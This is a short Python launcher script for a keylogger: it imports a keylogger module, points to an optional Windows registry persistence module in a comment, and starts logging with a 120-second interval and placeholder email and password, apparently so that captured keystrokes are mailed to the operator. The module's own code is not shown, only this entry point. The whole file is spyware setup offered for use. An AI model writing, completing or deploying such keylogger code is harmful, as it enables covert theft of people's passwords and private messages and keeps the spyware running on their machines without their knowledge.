#!/usr/bin/python
import keylogger

# OR if you are packaging on Windows and want to add to registry

#import keylogger_persistance_windows

'''
Keylogger
'''

#Main program
my_keylogger = keylogger.Keylogger(120, "tyep_your_email_here", "password_here")
my_keylogger.start()
